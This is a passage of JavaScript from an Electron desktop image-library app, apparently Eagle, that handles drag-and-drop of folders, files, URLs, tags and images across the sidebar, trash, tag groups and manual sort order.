    if (event.dataTransfer && event.dataTransfer.items) {
        event && event.preventDefault();
        event && event.stopPropagation();
        // event.dataTransfer.dropEffect = "copy"

        if (event.dataTransfer.items.length <= 0) return;

        isDraggingFolder = false;
        if (event.dataTransfer.items.length === 1) {
            for (let i = 0; i < event.dataTransfer.items.length; i++) {
                const item = event.dataTransfer.items[i];
                if (item.type === "") {
                    isDraggingFolder = true;
                }   
            }
        }
    }
    else {
        isDraggingFolder = false;
    }

    // if (event.dataTransfer && event.dataTransfer.files) {
    //     if (event.dataTransfer.files.length > 1) return;
    //     if (event.dataTransfer.files.length <= 0) return;
    //     var path = event.dataTransfer.files[0].path;
    //     if (fs.statSync(path).isDirectory()) {
    //         isDraggingFolder = true;
    //     }
    //     else {
    //         isDraggingFolder = false;
    //     }
    // }
    // else {
    //     isDraggingFolder = false;
    // }
    // console.log("dragging: ", dragging)
    if (!isDraggingFolder) return;
    if (!dragging && !draggingTags && !draggingFolder) {
        event.dataTransfer.dropEffect = "copy"
        $(".sidebar-container").addClass("dragging-folder");
    }
    return false;
}, 100);

function onDragLeaveSidebar (event) {
    console.log("onDragLeaveSidebar");
    event.preventDefault();
    event.stopPropagation();
    $(".sidebar-container").removeClass("dragging-folder dragging-smart-folder");
    return false;
};

function onMouseMoveSidebar (event) {
    if (!dragging) {
        $(".sidebar-container").removeClass("dragging-folder dragging-smart-folder");
    }
    else {
        event.preventDefault();
        event.stopPropagation();
    }
    return false;
};

// NOTE: 如果使用者拖拽时，点击 esc 取消，dragging 不会还原回 false
// var onMouseMoveSidebar2Timeout;
// $(document).on("mouseup.dropCancel", function () {
//     console.log("MOUSE_UP");
//     if (dragging) { dragging = false; }
// });

function onMouseMoveSidebar2 (event) {
    // console.log(event.button)
    // clearTimeout(onMouseMoveSidebar2Timeout);
    // onMouseMoveSidebar2Timeout = setTimeout(function () {
    //     if (dragging) { dragging = false; }
    // }, 333);
};

function onDropSidebar(event) {

    if (dragging) {
        event && event.preventDefault();
        event && event.stopPropagation();
    }

    var dropFolders = [];
    var isDraggingFolder = false;
    var files = _.get(event, 'dataTransfer.files', []);
    var $scope = angular.element("body").scope();

    if (files.length === 0) return;

    dragging = false;
    $(".sidebar-container").removeClass("dragging-folder dragging-smart-folder");

    if (!dragging && files.length == 1 && files[0].path.indexOf(".eaglepack") !== -1) {
        var file = files[0];
        var packPath = file.path;
        var folderId = _.get($scope, 'currentFolder.id');

        ipcRenderer.send("open-eaglepack", {
            path: packPath,
            folderId: folderId
        });
        return;
    }
    else if (!dragging && files.length == 1 && files[0].path.endsWith(".library")) {
        var file = files[0];
        var libraryPath = file.path;
        ipcRenderer.send('open-library', libraryPath);
        return;
    }

    // 如果文件夾名稱過長，路徑會變成很奇怪的符號
    if (files[0] && !fs.existsSync(files[0].path)) {
        swal({
            html: `
                <div class="alert">
                    <div class="alert-icon error"></div>
                    <h4 class="alert-title">${i18n.__("Dialog.PathTooLong.Title")}</h4>
                    <p class="alert-desc">${i18n.__("Dialog.PathTooLong.Description")}</p>
                </div>
            `,
            showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
            width: 400,
            customClass: "alert-box",
            cancelButtonColor: "#777777",
            confirmButtonText: i18n.__('Dialog.PathTooLong.Close'),
        }).then(function () {});
        electronLog && electronLog.error("[app] Unable to add file, beacuse the path is too long: " + files[0].path);
        return;
    }

    for (var i = 0; i < files.length; i++) {
        var file = files[i]
        var filePath = file.path;
        var ext = getExt({path: filePath});
        
        if (!ext && IS_DIRECTORY.check(filePath)) {
            isDraggingFolder = true;
            dropFolders.push(filePath);
        }
    }

    if (isDraggingFolder) {
        $(".sidebar-container").removeClass("dragging-folder dragging-smart-folder");

        // 确保拖拽文件夹使用 a-z 顺序
        if (dropFolders && dropFolders.length > 1) {
            var collator = new Intl.Collator(languageBCP, { numeric: true, sensitivity: 'base' } );
            dropFolders = dropFolders.sort(function (a, b) {
                return collator.compare(a, b);
            });
        }

        dropFolders.forEach(function (p) {
            uploadFolderToSidebar(p);
        });
    }
}

function uploadFolderToSidebar (path, parent) {
    // var path = event.dataTransfer.files[0].path;
    // 如果用户拖拽的是文件夹，将文件夹所有内容添加至 eagle
    if (IS_DIRECTORY.check(path)) {
        var folderInfo = getFolderList(path);
        // 阶层过多警告
        if (folderInfo.depth >= 15 || folderInfo.fileCount >= 100000) {
            var $filter = angular.element(document.body).injector().get('$filter');
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon error"></div>
                        <h4 class="alert-title">${i18n.__("dialog.dropTooManyLevel.title")}</h4>
                        <p class="alert-desc">${i18n.__("dialog.dropTooManyLevel.desc")}</p>
                    </div>
                `,
                showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("dialog.dropTooManyLevel.button"),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function () {
                // uploadFilesFromFolder(folderInfo.tree);
            });
        }
        // 文件数量过多警告
        else if (folderInfo.fileCount >= 2000) {
            var $filter = angular.element(document.body).injector().get('$filter');
            var message = $filter('i18n')("dialog.dropTooManyFolder.desc", [
                { "property": "count", "value": folderInfo.fileCount }
            ]);
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon warning"></div>
                        <h4 class="alert-title">${i18n.__("dialog.dropTooManyFolder.title")}</h4>
                        <p class="alert-desc">${message}</p>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
	            customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("dialog.dropTooManyFolder.button"),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function () {
                uploadFilesFromFolder(folderInfo.tree, parent);
            });
        }
        else {
            uploadFilesFromFolder(folderInfo.tree, parent);
        }
    }
}

// 上传电脑上某个文件夹，并依据文件夹结构，上传图片
function uploadFilesFromFolder (tree, parent) {

    var $scope = angular.element("body").scope();
    var folderMappings = {};

    // 建立对应结构的文件夾
    var folder = {
        id: tree.id,
        name: path.basename(tree.dir),
        children: [],
        modificationTime: Date.now(),
        tags: [],
        isExpand: true,
    };

    createFolderStruture(folder, tree);

    if (parent && parent.id) {
        folder.parent = parent.id;
        parent.children.push(folder);
    }
    else {
        $scope.folders.push(folder);
    }

    $scope.updateSidebarList();
    $scope.openFolder(folder);
    $scope.$evalAsync();
    $scope.saveFolderDebounce();
    $scope.calculateImageBinding({ ignoreSort: true }, function () {})
    setTimeout(function () { $scope.changeSidebarIndex(folder); $scope.$evalAsync(); }, 200);

    // 開始上傳圖片
    var fds = [];
    eagle.utils.tree.walk({folders: [tree], files: []}, 'folders', function (node, parent) {
        var files = node.files;
        var folderId = node.id;
        var now = Date.now();
        for (var i = 0; i < files.length; i++) {

            var filePath = files[i];
            var file = {
                name: path.basename(filePath),
                path: filePath,
                lastModified: now,
                folders: [folderId]
            };

            var ext = getExt(file);
            if (ext) {
            // if (ext && EagleConfig.SUPPORT_FORMATS[ext]) {
                file.type = "image/" + ext;
                fds.push(file);
            }
            else {
                if (!IS_DIRECTORY.check(filePath) || filePath.endsWith(".mindnode") || filePath.endsWith(".key") || filePath.endsWith(".pxd")) {
                    // var ext = getExt(file);
                    if (EagleConfig.SUPPORT_FORMATS[ext]) {
                        file.type = "image/" + ext;
                        fds.push(file);
                    }
                    else if (filePath.indexOf("svg") !== -1) {
                        file.type = "image/svg-xml";
                        fds.push(file);
                    }
                    else {
                        fds.push(file);
                        // let reason = (process.platform === 'darwin')? i18n.__("Dialog.NotSupport.Format.Descript.Mac") :  i18n.__("Dialog.NotSupport.Format.Descript.Windows");
                        // $bodyScope.errorList.push({
                        //     type: 'ADD_ERROR',
                        //     object: { 
                        //         name: file.name,
                        //         path: file.path 
                        //     },
                        //     reason: reason
                        // });
                    }
                }
            }
        }
    });
    
    if (fds.length > 0) {
        // Windows 拖拽顺序无法对应当前 explorer，所以这里自己做了排序
        if (process.platform === 'win32') { sortByAZ(fds); }
        $scope.uploadFiles(fds);
        $scope.showUploadQueue();
    }
    electronLog && electronLog.info(`[app] Add local folder: ${tree.dir}, total: ${fds.length} files`);
    analytics.event('LocalFolders', 'Import');
}

/**
 * 當拖曳至資料夾上方
 *
 * @param      {<type>}  event   拖曳事件
 */
var onDragOverFolder = throttle(function onDragOverFolder (event) {
    if (dragging) {
        event && event.preventDefault();
        event && event.stopPropagation();
    }
    if (draggingTags || draggingFolder) return;
    if ($("#box-container").hasClass("drag-accept")) {
        $("#box-container").removeClass("drag-accept");
    }
    $("#trash-item").removeClass("drop");
    var $item = $(".folder-node, .sidebar-container .item").has(event.target);
    // if ($item.hasClass("locked")) return;
    $item.addClass("drop");
    return;
}, 150);

function onDragLeaveFolder () {
    if (dragging) {
        event && event.preventDefault();
        event && event.stopPropagation();
    }
    $(".folder-node, .sidebar-container .item").has(event.target).removeClass("drop");
    return;
}
// function onDragOverFolder(event) {
//     event && event.preventDefault();
//     event && event.stopPropagation();
//     console.log("onDragOverFolder")
//     if (draggingTags) return;
//     // if (event.dataTransfer && event.dataTransfer.files.length > 0) {
//     //     var path = event.dataTransfer.files[0].path;
//     //     if (event.dataTransfer.files.length == 1) {
//     //         if (fs.statSync(path).isDirectory()) {
//     //             isDraggingFolder = true;
//     //             event.dataTransfer.dropEffect = "copy"
//     //             $(".sidebar-container").addClass("dragging-folder dragging-smart-folder");
//     //             return;
//     //         }
//     //     }
//     // }
//     $("#box-container").removeClass("drag-accept");
//     $("#trash-item").removeClass("drop");
//     $(".folder-node").has(event.target).addClass("drop");
//     return;
// }

/**
 * 當拖曳至垃圾桶上方
 *
 * @param      {<type>}  event   拖曳事件
 */
function onDragOverTrash(event) {
    event && event.preventDefault();
    event && event.stopPropagation();
    if (draggingTags || draggingFolder) return;
    $("#box-container").removeClass("drag-accept");
    // $("#trash-item").removeClass("drop");
    $("#trash-item").addClass("drop");
    // $(".group-item-name").has(event.target).parent().addClass("drop");
    return;
}

function onDragOverSubFolder (event) {
    $("#sub-folder-container .sub-folder.drag-accept").removeClass("drag-accept");
    $("#sub-folder-container .sub-folder").has(event.target).addClass("drag-accept");
}

function onDragEndSubFolder (event) {
    $("#sub-folder-container .sub-folder.drag-accept").removeClass("drag-accept");
}

/**
 * 將檔案或連結拖曳至資料夾列表項目中
 *
 * @param      {<type>}  event   拖曳事件
 */
function onDropFolder(event) {

    if (dragging) {
        event && event.preventDefault();
        event && event.stopPropagation();
        clearTimeout(hoverFolderTimeout);
    }
    
    var ipcRenderer = require('electron').ipcRenderer;
    var $rootScope = angular.element("body").scope();
    var $scope = angular.element("body").scope();
    var folder = angular.element(event.target).scope().node || angular.element(event.target).scope().folder || $scope.currentFolder;
    var selected = $scope.selected;
    var dragUrl = event.dataTransfer && jQuery("<div></div>").html(event.dataTransfer.getData("text/html")).find("img").attr("src");
    var files = event.dataTransfer && event.dataTransfer.files;

    // 如果用户拖拽到快速访问的文件夹中
    if (folder.vstype === "quickAccess") {
        folder = $scope.folderMappings[folder.id];
    }

    // 拖拽到子文件夹
    if ($("#sub-folder-container .sub-folder").has(event.target).length > 0) {
        $("#sub-folder-container .sub-folder.drag-accept").removeClass("drag-accept");
        folder = angular.element(event.target).scope().folder;
    }

    if (dragging && !dragUrl && event.dataTransfer) {
        if (is.url(event.dataTransfer.getData("text/plain"))) {
            dragUrl = event.dataTransfer.getData("text/plain");
        }
    }
    if (!dragging && files && files.length == 1 && files[0].path.indexOf(".eaglepack") !== -1) {
        var file = files[0];
        var packPath = file.path;
        ipcRenderer.send("open-eaglepack", {
            path: packPath,
            folderId: folder && folder.id
        });
        $(".folder-node, .sidebar-container .item").removeClass("drop");
        if (folder.password && !folder.isUnLock) return;
        return;
    }

    // 拖曳內部圖片
    if (dragging && folder && selected && selected.length > 0) {
        // 如果文件夹上锁，先询问用户密码，并进行解锁
        if (folder.password && !folder.isUnLock) {
            $scope.unlockFolderConf(folder, function (result) {
                classifySelected(event, $scope, selected, folder);
                $(".folder-node, .sidebar-container .item").removeClass("drop");
                $("#trash-item").removeClass("drop");
                dragging = false;
                folder.isUnLock = true;
            }, function () {
                $(".folder-node, .sidebar-container .item").removeClass("drop");
                $("#trash-item").removeClass("drop");
                dragging = false;
            });
            return;
        }
        else {
            classifySelected(event, $scope, selected, folder);
        }
    }
    else if (dragUrl) {
        event && event.stopPropagation();
        $scope.uploadUrl(dragUrl, folder);
        electronLog && electronLog.info(`[app] Drop url: ${dragUrl} to: ${folder.name}(${folder.id})(Sidebar)`);
    }
    else if (files && files[0]) {
        event && event.stopPropagation();
        var fds = [];
        for (var i = 0; i < files.length; i++) {
            var path = files[i].path;
            if (!IS_DIRECTORY.check(path)) {
                var ext = getExt(files[i]);

                if (ext) {
                // if (EagleConfig.SUPPORT_FORMATS[ext]) {
                    files[i].type = "image/" + ext;
                    fds.push(files[i]);
                }
                else if (path.indexOf("svg") !== -1) {
                    files[i].type = "image/svg-xml";
                    fds.push(files[i]);
                }
            }
        }
        electronLog && electronLog.info(`[app] Drop ${files.length} files to: ${folder.name}(${folder.id})(Sidebar)`);
        // Windows 拖拽顺序无法对应当前 explorer，所以这里自己做了排序
        if (process.platform === 'win32') { sortByAZ(fds); }
        $scope.uploadFiles(fds, folder);
        $scope.$evalAsync();
    }
    $(".folder-node, .sidebar-container .item").removeClass("drop");
    $("#trash-item").removeClass("drop");
    $scope.$evalAsync();
    dragging = false;
}

function classifySelected (event, $scope, selected, folder) {

    $bodyScope.checkOperationSafety(function () {

        var $rootScope = angular.element("body").scope();
        $scope.$evalAsync(function() {

            var origin = [];
            var originFolders = [];
            var originTags = [];

            // 同一個資料夾，不需要移動
            if (selected.length === 1 && selected[0].folders && selected[0].folders.length === 1 &&  selected[0].folders.indexOf(folder.id) !== -1) {
                return;
            }

            // 移除當前文件夾，放到新的文件夾
            selected.forEach(function(image) {

                origin.push(image);
                originFolders.push(angular.copy(image.folders));
                originTags.push(angular.copy(image.tags));

                if (!image.folders) image.folders = [];
                if (!image.tags) image.tags = [];
                // if (image.folders.indexOf(folder.id) === -1) {
                    // 從當前資料夾移除
                    if (!event.altKey) {
                        // 如果是多选文件夹
                        if ($rootScope.selectedFolders && $rootScope.selectedFolders.length > 0 && image.folders.length > 0) {
                            $rootScope.selectedFolders.forEach(function (f) {
                                var idx = image.folders.indexOf(f.id);
                                if (idx > -1) {
                                    image.folders.splice(idx, 1);
                                }
                                $scope.updateFilterCounts(image, true);
                            });
                        }
                        else if ($scope.currentFolder && image.folders.length > 0) {
                            var idx = image.folders.indexOf($scope.currentFolder.id);
                            if (idx > -1) {
                                image.folders.splice(idx, 1);
                            }
                            else if ($scope.isInFolder(image, $scope.currentFolder)) {
                                image.folders = [];
                            }
                            $scope.updateFilterCounts(image, true);
                        }
                    }
                    image.folders.push(folder.id);
                    image.folders = [...new Set(image.folders)]
                    if (folder.extendTags) {
                        folder.extendTags.forEach(function(tag) {
                            if (image.tags.indexOf(tag) === -1) {
                                image.tags.push(tag);
                            }
                        });
                        image.tags = [...new Set(image.tags)];
                    }
                // }
                image.isDeleted = false;
            });
            // ipcRenderer.send('images-change', selected);
            ayncsImagesChange(selected);
            hiddenByCurrentFilter(selected);

            if (folder) {
                if ($scope.currentFolder) {
                    if (!event.altKey) {
                        electronLog && electronLog.info(`[app] Move ${selected.length} from: ${$scope.currentFolder.name}(${$scope.currentFolder.id}) to: ${folder.name}(${folder.id})`);
                    }
                    else {
                        electronLog && electronLog.info(`[app] Categorize ${selected.length} from: ${$scope.currentFolder.name}(${$scope.currentFolder.id}) to: ${folder.name}(${folder.id})`);
                    }
                }
                else {
                    if (!event.altKey) {
                        electronLog && electronLog.info(`[app] Move ${selected.length} files to: ${folder.name}(${folder.id})`);
                    }
                    else {
                        electronLog && electronLog.info(`[app] Categorize ${selected.length} files to ${folder.name}(${folder.id})`);
                    }
                }
            }
            
            console.time("onDropFolder");
            if (($scope.currentFolder && !event.altKey) || $scope.viewMode === 'unfiled' || $scope.viewMode === 'trash') {
                var itemElements = $scope.getSelectedItemElements();
                $rootScope.$broadcast("gl:removeItems", itemElements);

                $scope.lastIndex = $scope.getSelection().start;

                // 自動選取下一個圖片，如果沒有下一個，選上一個，都沒有就空
                var next = $scope.allData[$scope.lastIndex + $scope.selected.length];
                var prev = $scope.allData[$scope.lastIndex - 1];
                if (next) {
                    $scope.selected = [next];
                    $scope.current = next;
                }
                else if (prev) {
                    $scope.selected = [prev];
                    $scope.current = prev;
                }
                else {
                    $scope.selected = [];
                    $scope.leaveDetailMode();
                }
                $scope.offsetScrollbar(100, true);
            }

            $scope.calculateImageBinding({ ignoreSort: true }, function () {
                $scope.rebindRefresh(true);
                $scope.updateSelection();
            });
            
            console.timeEnd("onDropFolder");
            $scope.addToRecentFolders([folder.id]);

            var message;
            if (event.altKey) {
                message = angular.element(document.body).injector().get('$filter')('i18n')("notify.image.addToFolder", [
                    { "property": "folderId", "value": folder.id },
                    { "property": "imageCount", "value": selected.length },
                    { "property": "folderName", "value": folder.name }
                ]);
            }
            else {
                message = angular.element(document.body).injector().get('$filter')('i18n')("notify.image.moveToFolder", [
                    { "property": "folderId", "value": folder.id },
                    { "property": "imageCount", "value": selected.length },
                    { "property": "folderName", "value": folder.name }
                ]);
            }
            

            $scope.notify({
                message: message,
                duration: 4000,
            }, function () {
                origin.forEach(function (image, index) {
                    image.folders = originFolders[index];
                    image.tags = originTags[index];
                    $scope.updateFilterCounts(image, false);
                });
                $scope.selected = origin;
                $scope.current = origin[0];
                $scope.calculateImageBinding({ ignoreSort: true }, function () {
                    $scope.rebindRefresh();
                    $scope.updateSelection();
                });
                // ipcRenderer.send('images-change', origin);
                ayncsImagesChange(origin);
            });
        });
        analytics.event('File', 'Categorize', 'Drag&Drop');

    }, 500);

}

function onDropTrash(event) {
    event && event.preventDefault();
    var ipcRenderer = require('electron').ipcRenderer;
    var $scope = angular.element("body").scope();
    // var folder = angular.element(event.target).scope().child || angular.element(event.target).scope().folder || $scope.currentFolder;
    var selected = $scope.selected;

    // 拖曳內部圖片
    if (dragging && selected && selected.length > 0) {
        electronLog && electronLog.info(`[app] Drag ${selected.length} files to Trash`);
        $scope.$evalAsync(function() {
            $scope.removeSelected();
            $scope.updateSelection();
        });
    }
    $(".folder-node, .sidebar-container .item").removeClass("drop");
    $("#trash-item").removeClass("drop");
    dragging = false;
}

function onDragLeaveSidebar (event) {
    event && event.preventDefault();
    event && event.stopPropagation();
    $(".folder-node, .sidebar-container .item").removeClass("drop");
    $("#trash-item").removeClass("drop");
};

function onDragLeaveSidebarContainer (event) {
    event && event.preventDefault();
    event && event.stopPropagation();
    if (isDraggingFolder) {
        $(".sidebar-container").removeClass("dragging-folder dragging-smart-folder");
    }
};

function getExt (file) {

    var extname = path.extname(file.path).toLowerCase();
    var ext = extname.replace(".", "");

    if (EagleConfig.SUPPORT_FORMATS[ext] === true) {
        return ext;
    }
    else if (extname === '.dmg') {
        return "dmg";
    }
    else if (extname === '.crdownload') {
        return undefined;
    }
    // 下载暂存文件 firefox
    else if (extname === '.part') {
        return undefined;
    }
    // 下载暂存文件 safari
    else if (extname === '.download') {
        return undefined;
    }
    else if (fs.statSync(file.path).isDirectory()) {
        return undefined;
    }
    return ext;
}

var draggingTags = false;
var $dargBadge = $("#tag-manager-drag-badge");
var onDragTag = _.throttle(function (event) {
    event && event.stopPropagation();
    if (event.clientX > 0 && event.clientY > 0) {
        var x = event.clientX + 2;
        var y = event.clientY - 20;
        $dargBadge.css({
            transform: `translate3d(${x}px, ${y}px, 0)`
        })
    }
}, 25);

function onDragTagStart(event) {
    // event && event.preventDefault();
    event && event.stopPropagation();
    event.dataTransfer.effectAllowed = "copyMove";
    event.dataTransfer.setDragImage(event.target, 0, 0);
    dragging = false;
    draggingTags = true;
    var x = event.clientX + 16;
    var y = event.clientY + 16;
    var $scope = angular.element("body").scope();
    var tag = $(event.target).find(".name").text();

    if (!$scope.selectedTags[tag]) {
        $scope.selectedTags = {};
        $scope.selectedTags[tag] = true;
        $scope.$evalAsync();
    }

    var tags = Object.keys($scope.selectedTags).map(function(key) {
        return key;
    });

    var $dargBadge = $("#tag-manager-drag-badge");
    if (tags.length > 1) {
        $dargBadge.text(tags.length);
        $dargBadge.show();
    }
    $dargBadge.css({
        transform: "translate3d(" + ~~(x) + "px, " + ~~(y) + "px, 0)"
    })
};

function onDragTagEnd(event) {
    // event && event.preventDefault();
    event && event.stopPropagation();
    draggingTags = false;
    var $dargBadge = $("#tag-manager-drag-badge");
    $dargBadge.css({
        transform: "translate3d(9999px, 9999px, 0)"
    })
    $dargBadge.hide();
    $(".tag-manager-sidebar .sidebar-item.drop").removeClass("drop");
    $(".tag-drop-area.drop").removeClass("drop");
};

function onDropTag (event) {
    event && event.stopPropagation();
    draggingTags = false;
    var $dargBadge = $("#tag-manager-drag-badge");
    $dargBadge.css({
        transform: "translate3d(9999px, 9999px, 0)"
    })
    $dargBadge.hide();

    var $scope = angular.element("body").scope();
    var tags = Object.keys($scope.selectedTags).map(function(key) {
        return key;
    });
    var group = angular.element(event.target).scope().group;
    if (group && group.id && tags.length > 0) {
        var temp = group.tags.concat(tags);
        temp = [...new Set(temp)];
        // 表示拖拽的标签全部都出现在该群组
        if (temp.length !== group.tags.length) {
            // var duplicateMode = $scope.tagViewMode !== "GROUP" || event.altKey;
            var duplicateMode = event.altKey;
            $scope.TagManager.addTagsToGroup(group.id, tags, duplicateMode);
            $(".tag-manager-sidebar .sidebar-item.drop").removeClass("drop");
            $scope.$evalAsync();
        }
    }
}

function onDropStarredTag (event) {
    event && event.stopPropagation();
    draggingTags = false;
    var $dargBadge = $("#tag-manager-drag-badge");
    $dargBadge.css({
        transform: "translate3d(9999px, 9999px, 0)"
    })
    $dargBadge.hide();

    var $scope = angular.element("body").scope();
    var tags = Object.keys($scope.selectedTags).map(function(key) {
        return key;
    });
    if (tags.length > 0) {
        $scope.TagManager.addStarredTags(tags);
        $(".tag-manager-sidebar .sidebar-item.drop").removeClass("drop");
        $scope.$evalAsync();
    }
}

// function onDragEnterTag (event) {
//     event.preventDefault();
// }

var onDragOverTag = _.throttle(function (event) {
    if (draggingTags) {
        event && event.preventDefault()
        event && event.stopPropagation();

        $(".tag-manager-sidebar .sidebar-item.drop").removeClass("drop");

        var $scope = angular.element("body").scope();
        var tags = Object.keys($scope.selectedTags).map(function(key) { return key; });
        var group = angular.element(event.target).scope().group;
        if (group && group.id && tags.length > 0) {
            var temp = group.tags.concat(tags);
            temp = [...new Set(temp)];
            // 表示拖拽的标签全部都出现在该群组
            if (temp.length !== group.tags.length) {
                $(".tag-manager-sidebar .sidebar-item").has(event.target).addClass("drop");
            }
        }
    }
}, 25);


function onDropTagSortArea (event) {
    event && event.stopPropagation();
    draggingTags = false;

    var $dargBadge = $("#tag-manager-drag-badge");
    $dargBadge.css({
        transform: "translate3d(9999px, 9999px, 0)"
    })
    $dargBadge.hide();

    var $scope = angular.element("body").scope();
    var selectedTags = Object.keys($scope.selectedTags).map(function(key) {
        return key;
    });

    var $tag = $(event.target).parent();
    var currentTag = angular.element($tag).scope().tag;
    var tags = angular.element($tag).scope().tgs;
    var currentTagGroup = angular.element($tag).scope().currentTagGroup;
    var prev = $(event.target).hasClass("first");
    var index = tags.indexOf(currentTag);
    var $scope = angular.element("body").scope();

    selectedTags = selectedTags.sort(function (a, b) {
        var idxa = tags.indexOf(a);
        var idxB = tags.indexOf(b);
        if(idxa > idxB) return 1;
        if(idxa < idxB) return -1;
        return 0;
    });

    if (index >= 0) {
        var shift = 0;
        var result = currentTagGroup.tags.filter(function (tag, tidx) {
            var idx = (selectedTags.indexOf(tag));
            if (idx !== -1) {
                if (index > tidx) {
                    shift++;
                }
                return false;
            }
            else {
                return true;
            }
        });
        if (!prev) {
            index += 1;
        }
        index -= shift;
        result.splice(index, 0, ...selectedTags);

        currentTagGroup.tags = result;
        $(".tag-drop-area.drop").removeClass("drop");
        $scope.$evalAsync();
        $scope.TagManager.saveGroup();
    }
}

var draggingFolder = false;
function onDragFolderStart (event) {
    var $bodyScope = angular.element("body").scope();
    if ($bodyScope.selectedFolders && $bodyScope.selectedFolders.length > 1) {

        draggingFolder = true;

        event.dataTransfer.setData("text/plain", event.target.id);

        var lastFolder = $bodyScope.selectedFolders[$bodyScope.selectedFolders.length - 1];

        var x = event.clientX + 16;
        var y = event.clientY + 16;
        var $dargBadge = $("#tag-manager-drag-badge");
        $dargBadge.text($bodyScope.selectedFolders.length);
        $dargBadge.show();
        $dargBadge.css({
            transform: "translate3d(" + ~~(x) + "px, " + ~~(y) + "px, 0)"
        });

        var dataTransfer = event.dataTransfer || event.originalEvent.dataTransfer;
        var $div = $("#multiple-drag-placeholder");
        $div.html(lastFolder.name);
        dataTransfer.setDragImage($div[0], 0, 0);
        // return;
    }
    else {
        event.preventDefault();
        draggingFolder = false;
        return false;
    }
};

var onDragFolder = _.throttle(function (event) {
    event && event.stopPropagation();

    var x = event.clientX + 24;
    var y = event.clientY + 4;

    if (event.clientX > 0 && event.clientY > 0) {
        $dargBadge.css({
            transform: "translate3d(" + ~~(x + $(event.target).width()) + "px, " + ~~(y) + "px, 0)"
        })
    }
}, 25);

function onDragOverBoxItem (event) {
    if (dragging) {
        event && event.preventDefault()
        event && event.stopPropagation();
        $(".box-sortable-helper.drag-over").removeClass("drag-over");
        $(event.target).addClass("drag-over");
    }
}

function onDragLeaveBoxItem (event) {
    if (dragging) {
        event && event.preventDefault()
        event && event.stopPropagation();
        $(event.target).removeClass("drag-over");
    }
}

function onDropBoxItem (event) {
    $(".box-sortable-helper.drag-over").removeClass("drag-over");
    if (dragging) {

        event && event.preventDefault()
        event && event.stopPropagation();

        var $scope = angular.element("body").scope();
        var $elements = draggingItems;
        var isAppend = $(event.target).hasClass("right");

        if (!$scope.currentFolder) return;

        var $target = $(".box").has(event.target);
        var currentFolderId = $scope.currentFolder.id;

        // 更新实际资料位置
        var selected = $scope.selected;
        var targetItem = $scope.getItemByElement($target[0]);

        // 以画面顺序排列
        selected = selected.sort(function (a, b) {
            var idxA = $scope.allData.indexOf(a);
            var idxB = $scope.allData.indexOf(b);
            return idxA - idxB;
        });

        selected.forEach(function(item) {
            var idx = $scope.allData.indexOf(item);
            if (idx != -1) {
                $scope.allData.splice(idx, 1);
            }
        });

        var checkOrderDuplicate = function () {
            var duplicateCheckMap = {};
            for (var i = 0; i < $scope.allData.length; i++) {
                let item = $scope.allData[i];
                if (item.order && item.order[currentFolderId]) {
                    let orderVal = item.order[currentFolderId];
                    if (duplicateCheckMap[orderVal]) {
                        return true
                        break;
                    }
                    duplicateCheckMap[orderVal] = item;
                }
            }
            return false;
        };

        // Note: 检查所有 order 是否有相同值，如果有，进行重置
        var isOrderDuplicate = checkOrderDuplicate();
        if (isOrderDuplicate) {
            debugger
            electronLog && electronLog.info(`[app] Reset manual layout orders...`);
            // 重置排序编号
            let changed = [];
            let precision = $scope.allData.length.toString().length + 1;
            let diff = 1 / Math.pow(10, (precision || 1));
            for (var i = 0; i < $scope.allData.length; i++) {
                let item = $scope.allData[i];
                if (item.order && item.order[currentFolderId]) {
                    let orderVal = item.order[currentFolderId];
                    if (sortIncrease) {
                        item.order[currentFolderId] = new BigNumber(orderVal).plus(diff * i).toPrecision();
                    }
                    else {
                        item.order[currentFolderId] = new BigNumber(orderVal).minus(diff * i).toPrecision();
                    }
                    changed.push(item);
                }
            }
            if (changed.length > 0) {
                ayncsImagesChange(changed);
            }
        }

        var idx = $scope.allData.indexOf(targetItem);

        // 计算 order 值
        // 如果 idx === 0, order 值 = modificationTime - 1
        // 其它, order 值 = (allData[idx - 1].modificationTime + allData[idx].modificationTime) / 2 + 中位数等差值 × index
        // 需要考虑升序降序问题
        var prev;
        var target;
        var prevOrder;
        var targetOrder;
        var middle;
        var diff;
        var sortIncrease;
        if ($scope.currentFolder.sortIncrease === undefined) {
            sortIncrease = $scope.sortIncrease;
        }
        else {
            sortIncrease = $scope.currentFolder.sortIncrease;
        }
        if (idx === 0) {
            if (!isAppend) {
                target = $scope.allData[idx];
                if (target) {
                    targetOrder = new BigNumber(_.get(target, `order[${currentFolderId}]`, target.modificationTime));
                    if (sortIncrease) {
                        // prevOrder = targetOrder + 1;
                        prevOrder = targetOrder.plus(1);
                    }
                    else {
                        // prevOrder = targetOrder - 1;
                        prevOrder = targetOrder.minus(1);
                    }
                    // middle = (prevOrder + targetOrder) / 2;
                    middle = prevOrder.plus(targetOrder).div(2);
                    // diff = Math.abs(middle - targetOrder) / selected.length;
                    diff = middle.minus(targetOrder).div(selected.length).toPrecision();
                }
            }
            else {
                prev = $scope.allData[0];
                target = $scope.allData[1];
                if (prev && target) {
                    prevOrder = _.get(prev, `order[${currentFolderId}]`, prev.modificationTime) || prev.modificationTime;
                    targetOrder = _.get(target, `order[${currentFolderId}]`, target.modificationTime) || target.modificationTime;
                    // middle = (prevOrder + targetOrder) / 2;
                    middle = new BigNumber(prevOrder).plus(targetOrder).div(2);
                    // diff = Math.abs(middle - targetOrder) / selected.length;
                    diff = middle.minus(targetOrder).div(selected.length).toPrecision();
                    idx = 1;
                }
            }
        }
        else {
            if (!isAppend) {
                prev = $scope.allData[idx - 1];
                target = $scope.allData[idx];
                if (prev && target) {
                    prevOrder = _.get(prev, `order[${currentFolderId}]`, prev.modificationTime) || prev.modificationTime;
                    targetOrder = _.get(target, `order[${currentFolderId}]`, target.modificationTime) || target.modificationTime;
                    // middle = (prevOrder + targetOrder) / 2;
                    middle = new BigNumber(prevOrder).plus(targetOrder).div(2);
